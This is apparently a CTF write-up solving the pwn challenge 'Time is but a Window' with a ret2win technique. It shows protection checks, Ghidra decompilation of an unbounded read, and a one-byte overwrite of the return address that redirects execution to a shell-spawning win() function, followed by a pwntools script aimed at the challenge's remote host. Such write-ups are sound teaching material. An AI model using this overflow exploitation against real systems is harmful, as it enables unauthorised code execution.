---
layout: post
title: CTF - Time is but a Window
date: 2024-01-15 12:40 +0200
categories: [Exploit Development,CTF - Challenges]
tags: [Pwn,Checksec,1-byte BufferOverflow,Ret2win,Ghidra,Not Stripped,Python,Dynamically Linked,Disassemble]  
image: "/assets/img/ctf/pwn/Time is but a Window/Cover.svg"
---

## **Challenge Description**

Think small, and simple. No fancy ROP chains or shellcode necessary, a single byte should be sufficient. 


## **Challenge Info**

|                      |                                                                                                  |
|:--------------------:|:------------------------------------------------------------------------------------------------:|
| **Challenge Name**   |  Time is but a Window                                                                            |
| **Difficulty**       |  Medium                                                                                            |
| **Points**           |  300                                                                                             |
| **Source**           |  UWSP Pointer Overflow CTF Challenge                                                             |



## Challenge Files

Here is the challenge file [Challenge.bin](/assets/img/ctf/pwn/Time is but a Window/Challenge.bin) which you need to solve the challenge you can downloaded it.


## **Enumeration**

### **CheckSEC**

We start with a checksec to check the protections on the binary file

![](/assets/img/ctf/pwn/Time is but a Window/Checksec.png)

|     Protection       |      Status      |                                                Usage                         |
|:--------------------:|:----------------:|:----------------------------------------------------------------------------:|
|   **Canary**         |     Disabled    |   Prevents **Buffer OverFlow**
|   **Fortify**        |     Disabled    |   Detect **certain classes** of buffer overflows
|   **NX**             |     Disabled    |   Disable **Code Execution** on the Stack
|   **PIE**            |     Enabled     |   Randomizes the **Base Address** of the binary
|   **RELRO**          |     FULL        |   Make some of the binary sections **Read Only**


**Canary :** A stack Canary is a `secret value` placed on the stack which changes every time the program is started. Before a function returns, the stack canary is checked and if it appears to be tampered with, the program exits immediately. Stack cookies can be leaked with the help of e.g `format string` vulnerabilities. They are a defense mechanism against stack buffer overflows.

**Fortify :** Security feature that attempts to detect certain classes of buffer overflows. Its enabled by default on most Linux platforms

**NX :** Stands for non-executable segment, meaning that we cannot execute code on the stack.

**PIE :** Stands for Position Independent Executable, which randomizes the base address of the binary, as it tells the loader which virtual address it should use. To take full advantage of this feature, the executing kernel must support text Address Space Layout Randomization `(ASLR)`.

**RELRO :** Stands for Relocation Read-Only. The headers of the binary are marked as read-only.


### **File info**

Run the file command on the binary we found that it is a `64 bit executable` file and `non stripped` this means the binary has debugging information built into it (eg. Function Names) also the file is `dynamically linked` this means the executable file linking external libraries and references at runtime, when the program is loaded or executed.


```console                              
(kali㉿0xRyuzak1)-[~]─$ file challenge.bin  
Challenge.bin: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=ee04914473e2edcc2f0cd1fcf5b8fab1590acaf2, for GNU/Linux 3.2.0, not stripped
```

### **Ldd**

Using `ldd` to print shared object dependencies and we found that the binary will use the `libc` from the running machine on this path `/lib/x86_64-linux-gnu/libc.so.6`

```console
(kali㉿0xRyuzak1)-[~]─$ ldd challenge.bin  
        linux-vdso.so.1 (0x00007ffc2efca000)
        libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f9405fc0000)
        /lib64/ld-linux-x86-64.so.2 (0x00007f94061c0000)
```

### **Run Binary**

The binary only take a name from user and print a nice to meet you message to him 

```console
(kali㉿Ryuzak1)-[~/Time is but a Window]─$ ./Challenge.bin 
Hello! What's your name?: Ryuzak1
Nice to meet you Ryuzak1!
```

Let's try enter large input to see if Buffer Overflow exist and as we can see we managed to crash the binary

```console
(kali㉿Ryuzak1)-[~/Time is but a Window]─$ ./Challenge.bin
Hello! What's your name?: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Nice to meet you AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA!
zsh: segmentation fault  ./Challenge.bin
```


## **Disassemble binary**

Using disassembler like [Ghidra](https://ghidra-sre.org/) to disassemble the binary. starting with `main()` since the binary is `not stripped`.

```c
undefined8 main(EVP_PKEY_CTX *param_1)

{
  init(param_1);
  greet();
  return 0;
}
```

As we can see it's simply call greet() function so let's check it 

```c
void greet(void)

{
  undefined local_18 [16];
  
  printf("Hello! What\'s your name?: ");
  get_string(local_18);
  printf("Nice to meet you %s!\n",local_18);
  return;
```

The function as we can see do the following : 
- **Line 4 :** Define a 16 length buffer
- **Line 6 :** Print the Hello Message to the user
- **Line 7 :** Using the get_string function which created in the binary to get the input from the user and i we can guess this is the vuln function 
- **Line 8 :** Print the Nice to meet you message

So let's check the `get_string` function  

```c
void get_string(long param_1)

{
  int iVar1;
  int local_c;
  
  local_c = 0;
  while( true ) {
    iVar1 = getchar();
    if ((char)iVar1 == '\n') break;
    *(char *)(local_c + param_1) = (char)iVar1;
    local_c = local_c + 1;
  }
  return;
```

The function as we can see takes a single parameter `param_1` of type `long`. The purpose of this function is to read a string of characters from the standard input until a `newline character ('\n')` is encountered. The characters are then stored in memory starting from the address specified by the parameter `param_1`. This which trigger the BOF.

We can also find that there is an unused function called `win()` so let's check it and as it's appears it's our target to get a easy shell

```c
void win(void)

{
  alarm(0);
  execl("/bin/bash","/bin/bash",0);
  return;
}
```

## **Ret2win Approach**

A `ret2win` is simply a binary where there is a `win()` function (or equivalent) once you successfully redirect execution there, you complete the challenge.

So in order to redirect the execution to this unused function we have to overwrite the `RIP` to point ot this function but as we saw before the `PIE` protection is enabled this time this means every time the binary run a binary randomization is happened so we will never now the correct address of the win function each time.

## **1-byte Buffer Overflow**

The 1 byte buffer overflow approach can help us in this situation because using this approach we don't need to know the exact full address of the `win()` function we just need to now the last byte of it which will be always the same for explanation. 

let's explain it more : 

Our `win()` function at this address `001013cb` before we run the binary and the `PIE` took effect after we run it the `win()` be at address `00005555555553cb` as you can see the last byte still the same and this will happened for all the functions

## **Exploitation**

So let's first check the offset of overwrite the `RIP` and as we can see the offset is `24`

![](/assets/img/ctf/pwn/Time is but a Window/Exploit1.png)

So let's write our exploit to start with 24 byte of junk then the last byte of the `win()` function which is `0xcb`

```python
from pwn import *

# Binary filename
exe = './challenge.bin'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)

# Connect to the remote IP and Port
io = remote("34.123.210.162","20234")

payload = flat([
    b'A' * 24,
    b'\xcb'
])

# Wait to get the 'Choice: ' string then send 1 to select the firs option
io.sendlineafter(b'Hello! What\'s your name?: ',payload)
io.recvuntil(b"!\n")
io.interactive()
```

And after we run our exploit we manged to gain a shell on the target and get the flag

![](/assets/img/ctf/pwn/Time is but a Window/Exploit2.gif)




